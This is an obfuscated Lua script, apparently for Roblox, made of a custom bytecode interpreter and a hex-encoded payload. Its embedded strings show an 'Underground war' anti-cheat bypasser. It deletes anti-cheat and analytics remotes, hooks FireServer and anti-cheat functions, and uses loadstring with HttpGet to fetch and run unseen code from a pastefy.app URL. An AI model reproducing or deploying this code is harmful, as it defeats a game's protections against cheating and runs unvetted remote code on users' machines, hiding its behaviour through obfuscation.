local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 81) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local Type = gBit(Descriptor, 2, 3);
				local Mask = gBit(Descriptor, 4, 6);
				local Inst = {gBits16(),gBits16(),nil,nil};
				if (Type == 0) then
					Inst[3] = gBits16();
					Inst[4] = gBits16();
				elseif (Type == 1) then
					Inst[3] = gBits32();
				elseif (Type == 2) then
					Inst[3] = gBits32() - (2 ^ 16);
				elseif (Type == 3) then
					Inst[3] = gBits32() - (2 ^ 16);
					Inst[4] = gBits16();
				end
				if (gBit(Mask, 1, 1) == 1) then
					Inst[2] = Consts[Inst[2]];
				end
				if (gBit(Mask, 2, 2) == 1) then
					Inst[3] = Consts[Inst[3]];
				end
				if (gBit(Mask, 3, 3) == 1) then
					Inst[4] = Consts[Inst[4]];
				end
				Instrs[Idx] = Inst;
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 33) then
					if (Enum <= 16) then
						if (Enum <= 7) then
							if (Enum <= 3) then
								if (Enum <= 1) then
									if (Enum > 0) then
										local A = Inst[2];
										local Results = {Stk[A](Unpack(Stk, A + 1, Top))};
										local Edx = 0;
										for Idx = A, Inst[4] do
											Edx = Edx + 1;
											Stk[Idx] = Results[Edx];
										end
									else
										local A = Inst[2];
										local C = Inst[4];
										local CB = A + 2;
										local Result = {Stk[A](Stk[A + 1], Stk[CB])};
										for Idx = 1, C do
											Stk[CB + Idx] = Result[Idx];
										end
										local R = Result[1];
										if R then
											Stk[CB] = R;
											VIP = Inst[3];
										else
											VIP = VIP + 1;
										end
									end
								elseif (Enum == 2) then
									Stk[Inst[2]] = Inst[3];
								elseif (Stk[Inst[2]] == Inst[4]) then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							elseif (Enum <= 5) then
								if (Enum == 4) then
									local A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
								else
									Stk[Inst[2]] = Env[Inst[3]];
								end
							elseif (Enum > 6) then
								local A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Inst[3]));
							else
								Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
							end
						elseif (Enum <= 11) then
							if (Enum <= 9) then
								if (Enum == 8) then
									local A = Inst[2];
									local T = Stk[A];
									for Idx = A + 1, Top do
										Insert(T, Stk[Idx]);
									end
								else
									Stk[Inst[2]] = Inst[3] ~= 0;
								end
							elseif (Enum == 10) then
								Stk[Inst[2]]();
							else
								Stk[Inst[2]] = {};
							end
						elseif (Enum <= 13) then
							if (Enum == 12) then
								local B = Stk[Inst[4]];
								if B then
									VIP = VIP + 1;
								else
									Stk[Inst[2]] = B;
									VIP = Inst[3];
								end
							else
								local A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Inst[3]));
							end
						elseif (Enum <= 14) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
						elseif (Enum == 15) then
							local A = Inst[2];
							local Results = {Stk[A](Unpack(Stk, A + 1, Top))};
							local Edx = 0;
							for Idx = A, Inst[4] do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							Stk[Inst[2]] = Stk[Inst[3]][Stk[Inst[4]]];
						end
					elseif (Enum <= 24) then
						if (Enum <= 20) then
							if (Enum <= 18) then
								if (Enum == 17) then
									local A = Inst[2];
									Stk[A] = Stk[A]();
								else
									local A = Inst[2];
									local Results, Limit = _R(Stk[A](Stk[A + 1]));
									Top = (Limit + A) - 1;
									local Edx = 0;
									for Idx = A, Top do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
								end
							elseif (Enum > 19) then
								Stk[Inst[2]] = Wrap(Proto[Inst[3]], nil, Env);
							else
								Stk[Inst[2]] = Upvalues[Inst[3]];
							end
						elseif (Enum <= 22) then
							if (Enum > 21) then
								if not Stk[Inst[2]] then
									VIP = VIP + 1;
								else
									VIP = Inst[3];
								end
							else
								local A = Inst[2];
								local Cls = {};
								for Idx = 1, #Lupvals do
									local List = Lupvals[Idx];
									for Idz = 0, #List do
										local Upv = List[Idz];
										local NStk = Upv[1];
										local DIP = Upv[2];
										if ((NStk == Stk) and (DIP >= A)) then
											Cls[DIP] = NStk[DIP];
											Upv[1] = Cls;
										end
									end
								end
							end
						elseif (Enum == 23) then
							local A = Inst[2];
							local C = Inst[4];
							local CB = A + 2;
							local Result = {Stk[A](Stk[A + 1], Stk[CB])};
							for Idx = 1, C do
								Stk[CB + Idx] = Result[Idx];
							end
							local R = Result[1];
							if R then
								Stk[CB] = R;
								VIP = Inst[3];
							else
								VIP = VIP + 1;
							end
						else
							local NewProto = Proto[Inst[3]];
							local NewUvals;
							local Indexes = {};
							NewUvals = Setmetatable({}, {__index=function(_, Key)
								local Val = Indexes[Key];
								return Val[1][Val[2]];
							end,__newindex=function(_, Key, Value)
								local Val = Indexes[Key];
								Val[1][Val[2]] = Value;
							end});
							for Idx = 1, Inst[4] do
								VIP = VIP + 1;
								local Mvm = Instr[VIP];
								if (Mvm[1] == 35) then
									Indexes[Idx - 1] = {Stk,Mvm[3]};
								else
									Indexes[Idx - 1] = {Upvalues,Mvm[3]};
								end
								Lupvals[#Lupvals + 1] = Indexes;
							end
							Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
						end
					elseif (Enum <= 28) then
						if (Enum <= 26) then
							if (Enum == 25) then
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							else
								local A = Inst[2];
								local Results = {Stk[A](Stk[A + 1])};
								local Edx = 0;
								for Idx = A, Inst[4] do
									Edx = Edx + 1;
									Stk[Idx] = Results[Edx];
								end
							end
						elseif (Enum > 27) then
							local A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
						elseif (Stk[Inst[2]] == Inst[4]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 30) then
						if (Enum == 29) then
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						else
							for Idx = Inst[2], Inst[3] do
								Stk[Idx] = nil;
							end
						end
					elseif (Enum <= 31) then
						Stk[Inst[2]][Inst[3]] = Inst[4];
					elseif (Enum == 32) then
						if Stk[Inst[2]] then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					else
						Stk[Inst[2]][Inst[3]] = Inst[4];
					end
				elseif (Enum <= 50) then
					if (Enum <= 41) then
						if (Enum <= 37) then
							if (Enum <= 35) then
								if (Enum > 34) then
									Stk[Inst[2]] = Stk[Inst[3]];
								else
									Stk[Inst[2]] = Env[Inst[3]];
								end
							elseif (Enum == 36) then
								local A = Inst[2];
								Stk[A] = Stk[A]();
							elseif Stk[Inst[2]] then
								VIP = VIP + 1;
							else
								VIP = Inst[3];
							end
						elseif (Enum <= 39) then
							if (Enum > 38) then
								VIP = Inst[3];
							else
								Stk[Inst[2]][Stk[Inst[3]]] = Inst[4];
							end
						elseif (Enum == 40) then
							local A = Inst[2];
							local T = Stk[A];
							for Idx = A + 1, Top do
								Insert(T, Stk[Idx]);
							end
						else
							local A = Inst[2];
							local B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
						end
					elseif (Enum <= 45) then
						if (Enum <= 43) then
							if (Enum == 42) then
								Stk[Inst[2]] = Inst[3];
							else
								Stk[Inst[2]] = Upvalues[Inst[3]];
							end
						elseif (Enum == 44) then
							local A = Inst[2];
							local Cls = {};
							for Idx = 1, #Lupvals do
								local List = Lupvals[Idx];
								for Idz = 0, #List do
									local Upv = List[Idz];
									local NStk = Upv[1];
									local DIP = Upv[2];
									if ((NStk == Stk) and (DIP >= A)) then
										Cls[DIP] = NStk[DIP];
										Upv[1] = Cls;
									end
								end
							end
						else
							Stk[Inst[2]] = Wrap(Proto[Inst[3]], nil, Env);
						end
					elseif (Enum <= 47) then
						if (Enum > 46) then
							do
								return;
							end
						else
							local A = Inst[2];
							Stk[A] = Stk[A](Stk[A + 1]);
						end
					elseif (Enum <= 48) then
						local NewProto = Proto[Inst[3]];
						local NewUvals;
						local Indexes = {};
						NewUvals = Setmetatable({}, {__index=function(_, Key)
							local Val = Indexes[Key];
							return Val[1][Val[2]];
						end,__newindex=function(_, Key, Value)
							local Val = Indexes[Key];
							Val[1][Val[2]] = Value;
						end});
						for Idx = 1, Inst[4] do
							VIP = VIP + 1;
							local Mvm = Instr[VIP];
							if (Mvm[1] == 35) then
								Indexes[Idx - 1] = {Stk,Mvm[3]};
							else
								Indexes[Idx - 1] = {Upvalues,Mvm[3]};
							end
							Lupvals[#Lupvals + 1] = Indexes;
						end
						Stk[Inst[2]] = Wrap(NewProto, NewUvals, Env);
					elseif (Enum == 49) then
						Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
					else
						Stk[Inst[2]][Stk[Inst[3]]] = Inst[4];
					end
				elseif (Enum <= 58) then
					if (Enum <= 54) then
						if (Enum <= 52) then
							if (Enum > 51) then
								for Idx = Inst[2], Inst[3] do
									Stk[Idx] = nil;
								end
							else
								Stk[Inst[2]] = Stk[Inst[3]];
							end
						elseif (Enum > 53) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							VIP = Inst[3];
						end
					elseif (Enum <= 56) then
						if (Enum == 55) then
							do
								return;
							end
						else
							local A = Inst[2];
							Stk[A](Stk[A + 1]);
						end
					elseif (Enum == 57) then
						Stk[Inst[2]] = Inst[3] ~= 0;
					elseif not Stk[Inst[2]] then
						VIP = VIP + 1;
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 62) then
					if (Enum <= 60) then
						if (Enum > 59) then
							local A = Inst[2];
							local Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
							Top = (Limit + A) - 1;
							local Edx = 0;
							for Idx = A, Top do
								Edx = Edx + 1;
								Stk[Idx] = Results[Edx];
							end
						else
							local B = Stk[Inst[4]];
							if B then
								VIP = VIP + 1;
							else
								Stk[Inst[2]] = B;
								VIP = Inst[3];
							end
						end
					elseif (Enum == 61) then
						Stk[Inst[2]]();
					else
						local A = Inst[2];
						Stk[A] = Stk[A](Stk[A + 1]);
					end
				elseif (Enum <= 64) then
					if (Enum > 63) then
						Stk[Inst[2]] = {};
					else
						local A = Inst[2];
						local Results, Limit = _R(Stk[A](Stk[A + 1]));
						Top = (Limit + A) - 1;
						local Edx = 0;
						for Idx = A, Top do
							Edx = Edx + 1;
							Stk[Idx] = Results[Edx];
						end
					end
				elseif (Enum <= 65) then
					local A = Inst[2];
					Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
				elseif (Enum > 66) then
					local A = Inst[2];
					local Results = {Stk[A](Stk[A + 1])};
					local Edx = 0;
					for Idx = A, Inst[4] do
						Edx = Edx + 1;
						Stk[Idx] = Results[Edx];
					end
				else
					local A = Inst[2];
					Stk[A](Stk[A + 1]);
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!1D3Q0003073Q0067657467656E76030D3Q002Q5F546D393055326C7362486B03043Q0067616D65030A3Q0047657453657276696365030A3Q005374617274657247756903073Q00536574436F726503103Q0053656E644E6F74696669636174696F6E03053Q005469746C6503063Q0042726F3Q2E03043Q0054657874031E3Q007468652073637269707420697320616C72656164792052752Q6E696E673F03083Q004475726174696F6E026Q0008402Q0103073Q00506C6179657273030B3Q004C6F63616C506C6179657203113Q005265706C69636174656453746F7261676503053Q007063612Q6C03063Q00787063612Q6C030E3Q0046696E6446697273744368696C6403123Q0047616D65416E616C7974696373452Q726F72031A3Q0047616D65416E616C797469637352656D6F7465436F6E6669677303043Q006E65787403073Q0044657374726F7903043Q007461736B03053Q00737061776E031E3Q00427970612Q73656420416E74694368656174E29DA4EFB88F205B56352B5D032B3Q00556E64657267726F756E642077617220416E7469436865617420627970612Q73657220627920482Q747073026Q00144000523Q0012053Q00014Q00243Q0001000200201D5Q00020006203Q001100013Q0004273Q001100010012053Q00033Q0020195Q0004001202000200054Q001C3Q000200020020195Q0006001202000200074Q004000033Q00030030210003000800090030210003000A000B0030210003000C000D2Q000D3Q000300012Q00373Q00013Q0012053Q00014Q00243Q000100020030213Q0002000E0012053Q00033Q0020195Q00040012020002000F4Q001C3Q0002000200201D5Q0010001205000100033Q002019000100010004001202000300114Q001C000100030002001205000200123Q00022D00036Q0042000200020001001205000200133Q00063000030001000100012Q00233Q00013Q00063000040002000100012Q00238Q000D0002000400012Q0040000200013Q002019000300010014001202000500154Q001C000300050002002019000400010014001202000600164Q0036000400064Q000800023Q0001001205000300174Q0033000400024Q0034000500053Q0004273Q003D00010006200007003C00013Q0004273Q003C0001001205000800123Q00063000090003000100012Q00233Q00074Q003E0008000200020006160008003C000100010004273Q003C000100201900093Q00182Q00420009000200012Q002C00065Q00061700030032000100020004273Q003200012Q004000035Q001205000400193Q00201D00040004001A00063000050004000100022Q00233Q00034Q00238Q0042000400020001001205000400033Q002019000400040004001202000600054Q001C000400060002002019000400040006001202000600074Q004000073Q000300302100070008001B0030210007000A001C0030210007000C001D2Q000D0004000700012Q00373Q00013Q00053Q00043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403203Q00682Q7470733A2Q2F706173746566792E612Q702F34317A464D7138792F72617700083Q0012053Q00013Q001205000100023Q002019000100010003001202000300044Q0036000100034Q00415Q00022Q000A3Q000100012Q00373Q00017Q000F3Q00030E3Q0046696E6446697273744368696C6403063Q004576656E747303063Q0052656D6F746503063Q00697061697273030E3Q0047657444657363656E64616E74732Q033Q00497341030B3Q0052656D6F74654576656E74030E3Q0052656D6F746546756E6374696F6E03063Q00737472696E6703043Q0066696E6403043Q004E616D6503073Q005265717565737403073Q0044657374726F79030A3Q0053656C665265706F727403103Q00416E746943686561745761726E696E67003F4Q002B7Q0020195Q0001001202000200024Q001C3Q0002000200060C0001000900013Q0004273Q0009000100201900013Q0001001202000300034Q001C0001000300020006200001002500013Q0004273Q00250001001205000200043Q0020190003000100052Q003F000300044Q000100023Q00040004273Q00230001002019000700060006001202000900074Q001C0007000900020006160007001A000100010004273Q001A0001002019000700060006001202000900084Q001C0007000900020006200007002300013Q0004273Q00230001001205000700093Q00201D00070007000A00201D00080006000B0012020009000C4Q001C0007000900020006200007002300013Q0004273Q0023000100201900070006000D2Q004200070002000100061700020010000100020004273Q001000010006203Q003400013Q0004273Q0034000100201D00023Q00030006200002003400013Q0004273Q0034000100201D00023Q00030020190002000200010012020004000E4Q001C0002000400020006200002003400013Q0004273Q0034000100201D00023Q000300201D00020002000E00201900020002000D2Q00420002000200010006203Q003E00013Q0004273Q003E000100201900023Q00010012020004000F4Q001C0002000400020006200002003E00013Q0004273Q003E000100201D00023Q000F00201900020002000D2Q00420002000200012Q00373Q00017Q00013Q0003073Q0044657374726F7900044Q002B7Q0020195Q00012Q00423Q000200012Q00373Q00017Q00023Q00030C3Q00682Q6F6B66756E6374696F6E030A3Q004669726553657276657200063Q0012053Q00014Q002B00015Q00201D00010001000200022D00026Q000D3Q000200012Q00373Q00013Q00018Q00024Q00373Q00014Q00373Q00017Q00103Q0003043Q006E65787403053Q00676574676303043Q007479706503083Q0066756E6374696F6E030A3Q0069736C636C6F7375726503113Q0069736578656375746F72636C6F7375726503053Q00646562756703073Q00676574696E666F03043Q006E616D65030F3Q006578706C6F6465596F757273656C6603053Q007063612Q6C03073Q0044657374726F792Q0103043Q007461736B03043Q0077616974026Q00F03F00333Q0012053Q00013Q001205000100024Q0009000200014Q00430001000200020004273Q002B0001001205000500034Q0033000600044Q003E00050002000200261B0005002A000100040004273Q002A0001001205000500054Q0033000600044Q003E0005000200020006200005002A00013Q0004273Q002A0001001205000500064Q0033000600044Q003E0005000200020006160005002A000100010004273Q002A0001001205000500073Q00201D0005000500082Q0033000600044Q003E00050002000200201D00060005000900261B0006002A0001000A0004273Q002A00012Q002B00066Q00060006000600040006160006002A000100010004273Q002A00010012050006000B3Q00063000073Q000100012Q00233Q00044Q003E00060002000200061600060028000100010004273Q002800012Q002B000700013Q00201900070007000C2Q00420007000200012Q002B00075Q00203200070004000D2Q002C00035Q0006173Q0005000100020004273Q000500010012053Q000E3Q00201D5Q000F001202000100104Q00423Q000200010004275Q00012Q00373Q00013Q00013Q00013Q00030C3Q00682Q6F6B66756E6374696F6E00053Q0012053Q00014Q002B00015Q00022D00026Q000D3Q000200012Q00373Q00013Q00018Q00024Q00373Q00014Q00373Q00017Q00", GetFEnv(), ...);
